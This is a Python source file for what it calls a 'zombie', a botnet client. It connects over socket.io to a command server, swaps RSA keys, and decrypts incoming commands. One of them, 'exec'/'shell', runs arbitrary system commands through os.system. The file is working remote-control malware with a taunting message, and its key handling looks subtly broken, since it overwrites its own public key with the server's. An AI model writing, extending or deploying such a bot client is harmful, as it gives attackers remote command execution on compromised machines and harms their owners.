import socketio
import os
import hashlib
import json
import time
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidSignature

sio = socketio.Client()

def generate_key_pair():
    key_size = 2048  

    private_key = rsa.generate_private_key(
        key_size=key_size,
        public_exponent=65537
    )

    public_key = private_key.public_key()
    return private_key, public_key

def export_public_key(public_key):
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')

def import_public_key(pem_data):
    return serialization.load_pem_public_key(pem_data.encode('utf-8'))

private_key, public_key = generate_key_pair()

@sio.event
def public_key_received(data):
    
    print(data)
    global public_key
    public_key = import_public_key(data)
    print("Public key received.")
    sio.emit('client_key_to_server', export_public_key(public_key))
    send_encrypted_message('message Hello from zombie!')
    send_encrypted_message('message USBO WAS FUCKING HERE BITCH!')

def encrypt(message: str) -> str:
    global public_key

    enc = public_key.encrypt(
        message.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return base64.b64encode(enc).decode('utf-8')

def send_encrypted_message(message):

    if public_key == None:
        return print('No public key')

    encoded_data = encrypt(message)
    a_hash = hashlib.sha256(message.encode('utf-8'))

    data = {
        'encrypted_message': encoded_data,
        'message_hash': a_hash.hexdigest()
    }
    
    sio.emit('message', json.dumps(data))

    
def decrypt(encrypted_data: str, message_hash: str) -> str:
    global private_key
    
    encrypted_bytes = base64.b64decode(encrypted_data)

    decrypted_data = private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    decrypted_message = decrypted_data.decode('utf-8')

    calculated_hash = hashlib.sha256(decrypted_message.encode()).hexdigest()

    if calculated_hash == message_hash:
        return decrypted_message
    else:
        raise ValueError("Hash non valido, messaggio corrotto")

@sio.event
def connect():
    global sio
    print('Connection established')
    sio.emit('client_key_to_server', export_public_key(public_key))
    print('Public key sent to server')

def ping(args):
    send_encrypted_message('message Pinged zombie!')

def shell(args):
    return os.system(' '.join(args[1:]))

@sio.event
def message(data):
    print(f"Ricevuto data: {data}")
    if isinstance(data, str):
        data = json.loads(data)

    encrypted_data = data['encrypted_message']
    received_hash = data['message_hash']
    
    try:
        decrypted_message = decrypt(encrypted_data, received_hash)
        print(f"Messaggio decifrato: {decrypted_message}")
        
        
        command = decrypted_message.split(' ')
        commands = [
            {
                'name': ['ping', 'check', 'hello'],
                'callback': ping,
            },
            {
                'name': ['exec', 'shell'],
                'callback': shell,
            }
        ]
        
        for cmd in commands:
            if command[0].replace('-all', '') in cmd['name']:
                cmd['callback'](command)
                
    except ValueError as e:
        print(f"Errore durante la decifrazione: {e}")


    
            

@sio.event
def disconnect():
    print('Disconnected from server')

def main():
    sio.connect('http://localhost:3000')
    sio.wait()

if __name__ == '__main__':
    main()
